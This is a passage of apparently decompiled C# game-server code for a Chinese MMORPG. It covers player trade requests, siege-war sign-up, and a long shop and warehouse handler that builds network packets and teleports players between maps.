					交易.交易人.Client.Send多包(array, array.Length);
				}
				交易.关闭交易();
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "对方取消交易请求出错  [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]  " + ex.Message);
			}
		}

		public void 本人取消交易请求(int 人物的ID, int 操作ID)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(6), 0, array, 10, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(6), 0, array, 14, 4);
				byte[] bytes = Encoding.Default.GetBytes(base.UserName);
				System.Buffer.BlockCopy(bytes, 0, array, 23, bytes.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 18, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (交易.交易人.Client != null)
				{
					交易.交易人.Client.Send多包(array, array.Length);
				}
				交易.关闭交易();
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "本人取消交易请求出错  [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]  " + ex.Message);
			}
		}

		public void 发送交易请求(int 人物的ID, int 操作ID)
		{
			try
			{
				if (!退出中 && !进店中 && !打开仓库中 && 人物的ID != base.人物全服ID && !base.Player死亡 && base.人物_HP > 0 && (个人商店 == null || !个人商店.个人商店是否开启) && (交易 == null || 交易.交易人 == null))
				{
					byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
					Players players = 得到人物数据(人物的ID);
					if (players != null && !players.退出中 && !players.打开仓库中 && !players.进店中 && !players.Player死亡 && players.人物_HP > 0 && (players.个人商店 == null || !players.个人商店.个人商店是否开启) && (players.交易 == null || players.交易.交易人 == null))
					{
						if (players.Config.交易 == 0)
						{
							系统提示("对方设置不容许交易。");
						}
						else
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
							System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
							System.Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array, 18, 4);
							byte[] bytes = Encoding.Default.GetBytes(base.UserName);
							System.Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
							交易 = new 交易类(players);
							players.交易 = new 交易类(this);
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
							if (players.Client != null)
							{
								players.Client.Send多包(array, array.Length);
							}
							if (base.Client != null)
							{
								base.Client.Send多包(array, array.Length);
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "请求交易出错  [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]  " + ex.Message);
			}
		}

		public void 参加攻城战()
		{
			try
			{
				if (World.攻城 == null)
				{
					系统提示("攻城没有开启无法参加!每周一周三周五9点开放攻城！", 9, "系统提示");
				}
				else if (base.帮派名字 == string.Empty)
				{
					系统提示("你还没加入门派，请加入门派再来参加！", 9, "系统提示");
				}
				else if (World.攻城战进程 == 4)
				{
					系统提示("攻城战已经开始现阶段无法参加...请等下次结束后参加", 50, "");
				}
				else
				{
					DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [攻城城主]  "));
					if (dBToDataTable.Rows[0]["攻城行会名"].ToString() == base.帮派名字)
					{
						World.申请攻城人物列表.Add(this);
						天魔移动(-427f, -13f, 15f, 42101);
					}
					else if (base.帮派名字 == string.Empty)
					{
						系统提示("你还没加入门派，请加入门派再来参加！", 9, "系统提示");
					}
					else
					{
						World.申请攻城人物列表.Add(this);
						天魔移动(-431f, -681f, 15f, 42101);
					}
					dBToDataTable.Dispose();
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "申请攻城战  出错：" + ((ex != null) ? ex.ToString() : null));
			}
		}

		private void 打开商店(int 商店ID_, int 操作ID_, int 页标_)
		{
			try
			{
				base.当前操作NPC = 商店ID_;
				base.当前操作类型 = 操作ID_;
				byte[] array = new byte[2];
				byte[] array2 = new byte[2];
				byte[] dst = new byte[2];
				System.Buffer.BlockCopy(BitConverter.GetBytes(页标_), 0, dst, 0, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(商店ID_), 0, array, 0, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID_), 0, array2, 0, 2);
				byte[] array3 = Converter.hexStringToByte("AA551E0000009100100001000000010000000100000000000000000000000000000055AA");
				switch (操作ID_)
				{
				case 22:
				{
					if (base.Player_Level < 130)
					{
						系统提示("级别小于130级不能进入高级竞技场。");
						return;
					}
					if (World.Eve90进程 > 2)
					{
						系统提示("高级竞技场有比赛正在进行,请等待下一轮。");
						return;
					}
					if (World.evePlayers != null && World.evePlayers.Count >= 2)
					{
						系统提示("申请人数已满,请等待下一轮。");
						return;
					}
					Players value;
					if (World.evePlayers.TryGetValue(base.人物全服ID, out value))
					{
						系统提示("不允许重复申请。");
						return;
					}
					查百宝阁元宝数();
					if (base.FLD_RXPIONT < World.进场最低费用)
					{
						系统提示("元宝不足" + World.进场最低费用 + ",不能进入高级竞技场。");
						return;
					}
					检察元宝数据(World.进场最低费用, 0);
					RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "高级竞技场进场费", 1, World.进场最低费用);
					切换PK模式(0);
					World.evePlayers.Add(base.人物全服ID, this);
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-302f, 288f, 15f, 2301);
					保存元宝数据();
					break;
				}
				case 1:
					if (商店ID_ == 0)
					{
						打开仓库中 = false;
						合成系统解锁();
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
					}
					else
					{
						打开仓库中 = true;
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
						合成物品表.Clear();
						if (商店ID_ == 6 && 操作ID_ == 1)
						{
							SerList.Clear();
							World.conn.发送("获取服务器列表|" + base.Userid + "|" + base.原服务器序号 + "|" + base.原服务器IP + "|" + base.原服务器端口 + "|" + base.原服务器ID);
						}
					}
					break;
				case 2:
					if (合成物品表 != null)
					{
						合成物品表.Clear();
					}
					元宝合成开关 = 0;
					打开仓库中 = false;
					合成系统解锁();
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					base.当前操作NPC = 0;
					base.当前操作类型 = 0;
					if ((商店ID_ == 1 || 商店ID_ == 14 || 商店ID_ == 18 || 商店ID_ == 41 || 商店ID_ == 93 || 商店ID_ == 11 || 商店ID_ == 23 || 商店ID_ == 43) && base.UserName.Length != 0)
					{
						保存个人仓库存储过程();
						保存综合仓库存储过程();
					}
					break;
				case 3:
				{
					List<ShopClass> shopListAll = ShopClass.GetShopListAll(商店ID_);
					new List<ShopClass>();
					List<ShopClass> list = (页标_ != 0) ? ShopClass.GetShopList(商店ID_, 页标_ - 101) : ShopClass.GetShopList(商店ID_, 0);
					发包类 发包类 = new 发包类();
					发包类.Write4(操作ID_);
					发包类.Write4(操作ID_);
					发包类.Write4(商店ID_);
					发包类.Write4(list.Count);
					发包类.Write4(0);
					if (页标_ == 0)
					{
						int num2 = shopListAll.Count / 60;
						if (shopListAll.Count % 60 > 0)
						{
							num2++;
						}
						发包类.Write8(num2);
					}
					else
					{
						发包类.Write8(页标_);
					}
					foreach (ShopClass item in list)
					{
						发包类.Write8(item.FLD_PID);
						if (item.FLD_MAGICZh > 0)
						{
							发包类.Write8(item.FLD_MAGICZh);
							if (item.FLD_MAGIC1 > 0)
							{
								发包类.Write8(item.FLD_MAGIC1);
							}
							if (item.FLD_MAGIC2 > 0)
							{
								发包类.Write8(item.FLD_MAGIC2);
							}
							if (item.FLD_MAGIC3 > 0)
							{
								发包类.Write8(item.FLD_MAGIC3);
							}
							if (item.FLD_MAGIC4 > 0)
							{
								发包类.Write8(item.FLD_MAGIC4);
							}
						}
						else
						{
							发包类.Write8(0L);
						}
						发包类.Write8(-1L);
					}
					if (base.Client != null)
					{
						base.Client.SendPak(发包类, 37120, base.人物全服ID);
					}
					return;
				}
				case 5:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					打开仓库中 = true;
					打开个人仓库();
					打开综合仓库();
					break;
				case 9:
					switch (BitConverter.ToInt16(array, 0))
					{
					case 27:
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(750f, -880f, 15f, 601);
						break;
					case 16:
						System.Buffer.BlockCopy(array, 0, array3, 18, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(0f, -600f, 15f, 501);
						break;
					case 15:
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(0f, -600f, 15f, 401);
						break;
					case 33:
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(1630f, -1578f, 15f, 1701);
						break;
					case 28:
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(-850f, -800f, 15f, 701);
						break;
					case 74:
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						if (base.Player_Zx == 1)
						{
							移动(1125f, -1555f, 15f, 2001);
						}
						else
						{
							移动(-2231f, 1495f, 15f, 2001);
						}
						break;
					case 34:
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(-1624f, 1561f, 15f, 1401);
						break;
					}
					break;
				case 12:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(12), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(12), 0, array3, 14, 2);
					发送势力战消息1();
					break;
				case 14:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 15:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					if (World.是否开启共用银币市场 == 1 && base.人物坐标_地图 != 1201)
					{
						换线移动(10f, 10f, 15f, 1201);
					}
					else
					{
						移动(10f, 10f, 15f, 1201);
					}
					break;
				case 17:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					if (World.是否开启共用银币市场 == 1 && (base.人物坐标_地图 == 1201 || base.人物坐标_地图 == 801))
					{
						换线移动(500f, 1575f, 15f, 101);
					}
					else
					{
						移动(500f, 1575f, 15f, 101);
					}
					break;
				case 38:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(1900f, -820f, 15f, 5001);
					break;
				case 23:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-302f, 288f, 15f, 2341);
					break;
				case 122:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 62:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-1f, -221f, 15f, 23001);
					break;
				case 63:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(500f, 1575f, 15f, 101);
					break;
				case 65:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23100);
					break;
				case 66:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23001);
					break;
				case 67:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23200);
					break;
				case 68:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23100);
					break;
				case 69:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23300);
					break;
				case 70:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23200);
					break;
				case 71:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23400);
					break;
				case 72:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23300);
					break;
				case 73:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23500);
					break;
				case 74:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23400);
					break;
				case 75:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23600);
					break;
				case 76:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23500);
					break;
				case 77:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23700);
					break;
				case 78:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23600);
					break;
				case 79:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23800);
					break;
				case 80:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23700);
					break;
				case 81:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23900);
					break;
				case 82:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23800);
					break;
				case 92:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(0f, -10f, 15f, 23050);
					break;
				case 94:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-900f, 145f, 15f, 6001);
					break;
				case 101:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 102:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 103:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 105:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 110:
				{
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					发包类 发包类2 = new 发包类();
					发包类2.Write2(base.人物全服ID);
					if (base.Client != null)
					{
						base.Client.SendPak(发包类2, 16663, base.人物全服ID);
					}
					break;
				}
				case 111:
					打开仓库中 = false;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 117:
					查百宝阁元宝数();
					if (base.FLD_RXPIONT >= World.申请门战需要元宝 && base.Player_Money >= 50000000L)
					{
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					}
					else
					{
						系统提示("申请帮战最少" + World.申请门战需要元宝 + "元宝和5000万游戏币。");
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					}
					break;
				case 173:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(1989f, -2027f, 15f, 26000);
					break;
				case 176:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 177:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 137:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					if (是否已婚 == 0 && 解除关系倒计时 > 0)
					{
						array2[0] = 2;
						if (合成物品表 != null)
						{
							合成物品表.Clear();
						}
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成系统解锁();
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
						解除男女关系();
					}
					break;
				case 139:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 140:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 142:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					if (是否已婚 == 1 && 解除关系倒计时 >= 0)
					{
						array2[0] = 2;
						if (合成物品表 != null)
						{
							合成物品表.Clear();
						}
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成系统解锁();
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
						解除男女关系();
					}
					else if (是否已婚 == 0 && 解除关系倒计时 >= 0)
					{
						array2[0] = 2;
						if (合成物品表 != null)
						{
							合成物品表.Clear();
						}
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成系统解锁();
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
						解除男女关系();
					}
					break;
				case 145:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 146:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 147:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					if (是否已婚 == 1 && 解除关系倒计时 > 0)
					{
						array2[0] = 2;
						if (合成物品表 != null)
						{
							合成物品表.Clear();
						}
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成系统解锁();
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
						System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
						base.当前操作NPC = 0;
						base.当前操作类型 = 0;
						解除男女关系();
					}
					break;
				case 148:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 149:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 150:
					if (base.Player_Job_leve < 6)
					{
						系统提示("只有升天以后才可以进入。");
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					}
					else
					{
						System.Buffer.BlockCopy(array, 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						移动(1884f, -1635f, 15f, 25100);
					}
					break;
				case 153:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-360f, -363f, 15f, 25201);
					break;
				case 154:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(117f, -267f, 15f, 25202);
					break;
				case 156:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(117f, -267f, 15f, 25301);
					break;
				case 157:
				{
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					int num = RNG.Next(2, 10);
					switch (num)
					{
					case 2:
						移动(117f, -267f, 15f, 25200 + num);
						break;
					case 3:
						移动(125f, -329f, 15f, 25200 + num);
						break;
					case 4:
						移动(124f, -244f, 15f, 25200 + num);
						break;
					case 5:
						移动(138f, -271f, 15f, 25200 + num);
						break;
					case 6:
						移动(158f, 256f, 15f, 25200 + num);
						break;
					case 7:
						移动(300f, 92f, 15f, 25200 + num);
						break;
					case 8:
						移动(158f, -302f, 15f, 25200 + num);
						break;
					case 9:
						移动(32f, 92f, 15f, 25200 + num);
						break;
					case 10:
						移动(154f, 30f, 15f, 25200 + num);
						break;
					}
					break;
				}
				case 158:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-360f, -363f, 15f, 25201);
					break;
				case 199:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
